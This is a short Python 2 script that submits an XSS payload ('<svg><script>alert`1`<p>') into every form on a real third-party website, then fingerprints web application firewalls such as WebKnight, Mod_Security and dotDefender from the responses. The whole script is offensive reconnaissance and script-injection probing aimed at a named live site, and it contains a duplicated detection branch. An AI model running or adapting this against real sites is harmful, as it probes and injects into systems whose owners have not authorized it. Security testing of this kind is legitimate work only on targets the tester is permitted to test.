import mechanize, urllib2

maliciousRequest = mechanize.Browser()
maliciousRequest.set_handle_robots(False)

# formName = 'waf'
maliciousRequest.open("http://hosts-file.net/default.asp?s=sshc.org")
crossSiteScriptingPayLoad = "<svg><script>alert&grave;1&grave;<p>"

currentForm = 0
for form in maliciousRequest.forms():
	maliciousRequest.select_form(nr = currentForm)
	print maliciousRequest.form

	choosenName = raw_input("Digite o nome: ")
	maliciousRequest.form[choosenName] = crossSiteScriptingPayLoad
	try:
		maliciousRequest.submit()
		pass
	except mechanize.HTTPError as e:
		pass
	except urllib2.HTTPError as a:
		continue
	response =  maliciousRequest.response().read()
	
	if response.find('WebKnight') >= 0:
		print "Firewall detected: WebKnight"
	elif response.find('Mod_Security') >= 0:
		print "Firewall detected: Mod Security"
	elif response.find('Mod_Security') >= 0:
		print "Firewall detected: Mod Security"
	elif response.find('dotDefender') >= 0:
		print "Firewall detected: Dot Defender"
	else:
		print "No Firewall Present"
	# Test the nest
	currentForm += 1